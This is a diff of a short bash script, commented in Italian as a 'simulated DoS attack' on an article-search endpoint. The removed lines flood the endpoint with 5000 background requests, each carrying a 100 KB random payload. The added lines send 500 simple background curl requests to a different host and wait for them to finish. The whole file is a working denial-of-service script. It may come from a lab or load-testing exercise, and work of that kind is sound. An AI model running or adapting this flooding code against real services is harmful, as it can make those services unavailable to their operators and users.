@@ -1,26 +1,17 @@
 #!/bin/bash
 
-# URL della rotta da attaccare
-URL="http://external.user:8000/articles/search"
-
-# Generare un grande payload casuale
-LARGE_PAYLOAD=$(head -c 100000 < /dev/urandom | base64)
-
-# Numero di richieste da inviare
-NUM_REQUESTS=5000
-
-# Funzione per eseguire la richiesta
-send_request() {
-    curl -G "$URL" --data-urlencode "query=$LARGE_PAYLOAD" > /dev/null 2>&1
-}
+URL="http://cyber.blog:8000/articles/search"
 
 echo "Inizio attacco DoS simulato..."
 
-# Loop per inviare tante richieste
-for ((i=1; i<=NUM_REQUESTS; i++))
+# Invia 500 richieste semplici in background
+for i in {1..500}
 do
-    send_request &
+    curl -s "$URL?q=test" >/dev/null 2>&1 &
     echo "Richiesta $i inviata"
 done
+
+# Aspetta che tutti i processi finiscano
+wait
 
 echo "Attacco DoS simulato completato!"
